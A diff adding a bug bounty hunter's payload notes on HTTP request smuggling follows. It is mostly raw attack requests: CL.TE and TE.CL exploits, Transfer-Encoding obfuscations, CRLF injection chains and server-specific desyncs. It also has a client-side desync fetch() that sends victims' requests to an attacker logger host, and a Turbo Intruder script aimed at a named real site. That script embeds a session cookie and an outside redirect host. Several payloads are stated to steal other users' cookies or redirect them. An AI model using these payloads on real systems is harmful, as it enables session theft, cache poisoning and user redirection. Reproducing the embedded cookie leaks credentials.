@@ -1,4 +1,348 @@
 MOST IMPORTANT: refer to notes because it is very specific in terms of what the content length has to be, how to structure the TE (hex or just 0) etc. Small errors could mean missing a bug so be sure to read while using these payloads
 
+- if we see any of the proxies/load balancers that we wrote down in the h2c notes we should test VERY thoroughly for smuggling. many of those sites will be vulnerable eg HaProxy
 
-** to do this find all accessible BB reports on this and steal their payloads. ALSO rewatch the BB reports explained video. Read/watch blogs, talks, presentations etc. This will be a request smuggling payload/obfuscation repo.
+-CRLF WILL MAKE IT MUCH MROE LIKELY WE CAN GET SMUGGLING -- even if we still cant get smuggling look into **RESPONSE INEJCTION** where we can inject headers/ body INTO the response which could enable cache poisoning
+- MOST OF THESE ABSOLUTLY NEED a keep-alive connection
+-potentially try attacking the reverse proxy directly, usually this is a service on port 8080, 8001, 8080 etc
+
+		**THERE IS GOLD IN HERE!! THE BEGINNING IS LEAST INTERESTING SCROLL DOWN AND READ EVERYTHING**
+----------------------------------------------------------------------------------------------------------------------------------------------------------
+BASIC DETECTION:
+
+CL.TE: SHOULD RESULT IN REQUEST TIMEOUT FOR CL.TE - rejection or harmless processing = no vuln
+POST /about HTTP/1.1
+Host: example.com
+Transfer-Encoding: chunked
+Content-Length: 4
+
+1
+Z
+Q
+
+TE.CL: IF ITS TE.CL THE REQUEST SHOULD TIME OUT. IF THE SOCKET IS POSIONED THEN WE HAVE CL.TE
+POST /about HTTP/1.1
+Host: example.com
+Transfer-Encoding: chunked
+Content-Length: 6
+
+0
+
+X
+----------------------------------------------------------------------------------------------------------------------------------------------------------
+BASIC CL.TE AND TE.CL EXPLOITS:	USE TURBO INTRUDER/SEND GROUP IN REPEATER TO DETECT SOCKET POISON -> change TE obfuscation as needed
+
+CL.TE: SHOULD RESULT IN 404
+POST /search HTTP/1.1
+Host: example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 53
+Transfer-Encoding: zchunked
+
+17
+=x&q=smuggling&x=
+0
+
+GET /404 HTTP/1.1
+Foo: b
+
+TE.CL: (content length slightly larger then body - victim request in the body)
+POST /search HTTP/1.1
+Host: example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 4
+Transfer-Encoding: zchunked
+
+96
+GET /404 HTTP/1.1
+X: x=1&q=smugging&x=
+Host: example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 100
+
+x=
+0
+
+POST /search HTTP/1.1
+Host: example.com  
+----------------------------------------------------------------------------------------------------------------------------------------------------------
+TE OBFUSCATIONS:
+Transfer-Encoding: xchunked
+Transfer-Encoding : chunked
+Transfer-Encoding: chunked
+Transfer-Encoding: x
+Transfer-Encoding:[tab]chunked
+GET / HTTP/1.1
+ Transfer-Encoding: chunked
+X: X[\n]Transfer-Encoding: chunked
+Transfer-Encoding
+ : chunked
+
+** Transfer-Encoding: chunked, chunked 	    //only put this header remove all CL headers causes server to assume CL of 0 and thus desyncs
+
+** X-Abc:\rxTransfer-Encoding: chunked\r\n  //note the '\r' prefacing the 'smuggled' TE header - considered a newline by Node.js v20 and prior
+
+HEADER:HEADER_VALUE\r\n
+HEADER:[SPACE]HEADER_VALUE\r\n
+HEADER:[SPACE]HEADER_VALUE[SPACE]\r\n
+HEADER[SPACE]:HEADER_VALUE\r\n 
+----------------------------------------------------------------------------------------------------------------------------------------------------------
+CRLF -> SMUGGLING:
+
+*** look for CRLF in query string!! we should be manually testing for CRLF in addition to automation. should be throwing "GET /%20HTTP/1.1%0d%0a%0d%0a" in the query line EVERYWHERE to terminate it early as shown in step 1.
+
+step 1. confirm CRLF is possible -> send req w/ "GET /%20HTTP/1.1%0d%0a%0d%0a HTTP/1.1" -> should result in 400 bad request w/ Connection: close
+
+step 2: add necessary headers for smuggling: GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0a HTTP/1.1 -> should give us 200 ok w/ Connection: keep-alive.
+
+step 3: add classical smuggling headers only thing is we need to account for potentially extra headers/body that the server appends to our request.:
+
+2 options for step 3: 
+1. this request is designed to posion the socket and cause users to be redirected to our own domain (fully terminated at the end by CRLF):
+GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0aGET%20/redirplz%20HTTP/1.1%0d%0aHost:%20oastify.com%0d%0a%0d%0aContent-Length:%2050%0d%0a%0d%0a HTTP/1.1
+
+2. this payload is designed to get other users data appended to it so we can see their cookies or other info (not fully terminated): 
+GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0aGET%20/%20HTTP/1.1%0d%0aFoo:%20bar HTTP/1.1
+
+****Sometimes this is more difficult to exploit: **if we send 1 request & get 2 responses in 1**
+When web browsers read in a response, if they encounter more data than the server promised in the Content-Length header, they truncate the response and close the connection. I dubbed this the stacked-response problem, and found it made exploiting Client-Side Desync vulnerabilities tougher but not impossible.
+I now suspect some major front-end servers have a similar mechanism, which has two security implications:
+
+	Regular desync attacks are unaffected, but response-queue poisoning is mitigated
+	It's difficult to convert response header injection into a HTTP desync
+
+We still may be able to exploit this and anytime we see a double stacked response we should be very interested. To bypass we need to delay the smuggled/injected response so that the front-ends inital check doesn't see it. One possible approach for this is to inject a large number of newlines, which are typically consumed by servers without triggering request/response processing. other then that this topic needs more research.
+
+***even if smuggling is not possible (or we cannot figure it out) we may be able to get response header injection which is still pretty severe. basically enables us to inject anything into the response via new lines from CRLF***
+----------------------------------------------------------------------------------------------------------------------------------------------------------
+NEWER APACHE SMUGGLING - confirmed in tomcat version 9.0.82 in dec 22, 2023
+
+**here we would have to generate a large number of chars as the value for the 'testtrailer' header. this causes apache to throw an IOException due to the header being two large. it then considers the single request as 2. again could always change this around a bit if we encounter CL.TE instead of this one which is TE.CL
+
+POST /examples/test.jsp HTTP/1.1
+Host: www.example.co.jp
+Content-Type: application/x-www-form-urlencoded
+Transfer-Encoding: chunked
+Connection: KeepAlive
+
+5
+foo=b
+2
+ar
+0
+testtrailer: aaaaa...(large size)
+a: GET /examples/?this_is_attack HTTP/1.1
+Host: attack
+
+----------------------------------------------------------------------------------------------------------------------------------------------------------
+************CL IGNORED ON CACHE HIT:  => EXTREMLY INTERESTING - TRY ON STATIC RESOURCES HOSTED ON A SENSATIVE TARGET DOMAINS**************
+
+We can hide a second request in the first request body, and we hide Hit this body becomes a new request.
+
+This sort of request will get one response first (and, yes, that's only one request), on a second launch it will render two responses (so an HTTP request Splitting by definition):	=> NONE OF THIS SYNTAX IS CONSIDERED INVALID
+
+****MUST HAVE Connection: keep-alive*******
+
+GET /index.html?cache=zorg42 HTTP/1.1\r\n
+Host: dummy-host7.example.com\r\n
+Cache-control: max-age=300\r\n
+Content-Length: 71\r\n
+\r\n
+GET /index.html?cache=zorg43 HTTP/1.1\r\n
+Host: dummy-host7.example.com\r\n
+\r\n
+
+this is one i feel could potentially be easily missed. I dont think many people are even aware of this particular type of smuggling. be on the lookout!
+
+----------------------------------------------------------------------------------------------------------------------------------------------------------
+*********2 REQUESTS NO TE HEADER = DESYNC -> NEWEST TYPE OF SMUGGLING THIS WAS REPORTED IN 2023 & FOUND ON AN AZURE SITE!!************
+
+this is considered to be 'Client Side Desync' - there is a LOT to this attack it is complex.
+
+literally 2 requests one or both of which can have the CL header depending on what we want to exploit. For example if we want to steal other users data we want a large CL in the smuggled request. We could also smuggle a host header to a domain we control without a CL enabling us to have the server return arbitrary JS we write or we could redirect to an old website we control that supports some old tech like frontdoor enabling us to get uXSS. 
+
+this could be done with something like this which causes vulnerable servers to wait for the remaining 200 bytes: 
+fetch('http://azure-victim.jeti.pw/x', {
+method: 'POST',
+  body: "POST /logger HTTP/1.1\r\nHost: azure-attacker.jeti.pw\r\nContent-Length: 200\r\n\r\n",
+  mode: 'no-cors',
+  redirect: 'follow',
+  credentials: 'include'
+})
+
+**NEED TO LOOK INTO THIS MORE WILL HAVE FULL NOTE DOC JSUT ON THIS.
+----------------------------------------------------------------------------------------------------------------------------------------------------------
+SMUGGLING VIA HUGE HEADER & EARLY END-of-QUERY: once again look for 400 followed by 200
+
+**we will have to write some code to make this, the header is absolutely giant. it just involves a header with a TON of repeated characters:
+X: ==============( 65 532 '=' )========================\r\n
+
+GET_/something.html?zorg=6_HTTP/1.1\r\n
+Host:_dummy-host7.example.com\r\n
+X:_"%65532s"\r\n		//REPLACE THIS LINE W/ GIANT HEADER CONTAINING 65532 = chars
+GET_http://dummy-host7.example.com/index.html?replaced=0&cache=8_HTTP/1.1\r\n
+\r\n
+----------------------------------------------------------------------------------------------------------------------------------------------------------
+NEW node.js CRLF COULD ENABLE SMUGGLING (found in 2023 node.js v16, v18, and, v20 and prior maybe after too?):
+
+X-Abc:\rxTransfer-Encoding: chunked\r\n
+----------------------------------------------------------------------------------------------------------------------------------------------------------
+SMUGGLING ON Apache HTTP Server Apache HTTP Server 2.4 version 2.4.53 and prior versions
+
+************ DO NOT PUT CL HEADER only put Transfer-Encoding: chunked, chunked *********************************
+
+BODY OF THE REQUEST ***MUST*** BE 514 BYTES LONG add padding to get the extra length if needed. find a relatively short domain for this that we can access while staying wihtin the necessary request. we can read any common apache file that is forbidden to show POC. 
+
+AGAIN MUST USE TURBO INTRUDER/ repeater group TO TEST. send the malicious post request w/ malformed TE and no CL then spam get requests w/ turbo intruder until we get the response we want
+----------------------------------------------------------------------------------------------------------------------------------------------------------
+Multi-line Transfer Encoding header (found in node.js patched in 2022): 
+
+very interesting - of course can add CL header if necessary **this was found in node.js**
+
+POST / HTTP/1.1
+Host: 127.0.0.1
+Transfer-Encoding: chunked
+ , chunked-false
+
+1
+A
+0
+
+GET /flag HTTP/1.1
+Host: 127.0.0.1
+foo: x
+----------------------------------------------------------------------------------------------------------------------------------------------------------
+simple CL descrepency: (older form of smuggling but affected many tehcnolgies apache, HaProxy .....)
+POST / HTTP/1.1
+Host: example.com
+Content-Length: 6
+Content-Length: 5
+
+12345GPOST / HTTP/1.1
+Host: example.com
+…
+
+GET /index.html?toto=1 HTTP/1.1\r\n
+Host: dummy-host7.example.com\r\n
+Content-Length: 0\r\n
+Content-Length: 66\r\n
+\r\n
+GET /index.html?toto=2 HTTP/1.1\r\n
+Host: dummy-host7.example.com\r\n
+\r\n
+
+
+----------------------------------------------------------------------------------------------------------------------------------------------------------
+****MULTIPLE TE HEADERS (CL.TE)- FIRST ONE VALID SECOND INVALID - can also try to switch order - (can just grab payload to test w/ repeater too)
+
+FULL TURBO INTRUDER SCRIPT:
+def queueRequests(target, wordlists):
+
+    engine = RequestEngine(endpoint='https://launchpad.37signals.com:443',
+                           concurrentConnections=3,
+                           requestsPerConnection=2,
+                           resumeSSL=False,
+                           timeout=10,
+                           pipeline=False,
+                           maxRetriesPerRequest=0,
+                           engine=Engine.THREADED,
+                           )
+
+    attack = '''POST /identity HTTP/1.1
+Host: launchpad.37signals.com
+Content-Length: 69
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Transfer-Encoding: chunked
+Transfer-Encoding: foo
+
+3
+x=1
+0
+
+GET / HTTP/1.1
+X-Forwarded-Host: hazimaslam.com
+Foo: bar'''
+
+    engine.queue(attack)
+
+    victim = '''GET /signin HTTP/1.1
+Host: launchpad.37signals.com
+Connection: close
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9,la;q=0.8
+Cookie: _launchpad_session=uViarUZn10afBS9AD4AgD9lF4iEk6%2FIfinxiAVgiEQNq2xMTKY86i9r%2FZEQ%2BENl183aEL845OspHItodYdrC0OIEWMzEjswGng%2F%2BXwE5nsYBhY7ep%2B%2FmrDB1ZXa%2B1NaAji52own5luVsggkP98GrqNjnWHxGdIfffZjMFwz3Q3fNxV0NilS1DmNiY0P72x9CDsrQfzc0HbGfnL%2BEvs9%2BODfbfJYnexsrxX2P78RaQ8wf--0zL8fFbFTz6maAwm--XxtVi%2BPuHcoHD8hjqSkxkQ%3D%3D
+
+'''
+    for i in range(6):
+        engine.queue(victim)
+        time.sleep(0.05)
+
+
+def handleResponse(req, interesting):
+    table.add(req)
+
+----------------------------------------------------------------------------------------------------------------------------------------------------------
+SMUGGLING VIA NULL CHARACTER INJECTION: (this is likely to get picked up by WAF in most cases but still very much worth trying)
+
+this should give:  400 bad request -> 200 ok -> 404 not found
+
+GET /something.html?zorg=1 HTTP/1.1\r\n
+Host: dummy-host7.example.com\r\n
+X-Something: "\0something"\r\n
+GET http://dummy-host7.example.com/index.html?replacing=1&zorg=2 HTTP/1.1\r\n
+\r\n
+GET /targeted.html?replaced=maybe&zorg=3 HTTP/1.1\r\n
+Host: dummy-host7.example.com\r\n
+\r\n
+----------------------------------------------------------------------------------------------------------------------------------------------------------
+2020 node.js CRLF related vuln could lead to smuggling:
+
+considers \r as a '-' => note the CL header 
+
+GET / HTTP/1.1
+Host: www.example.com
+Content[CR]Length: 42
+Connection: Keep-Alive
+GET /proxy_sees_this HTTP/1.1
+Something: GET /node_sees_this HTTP/1.1
+Host: www.example.com
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
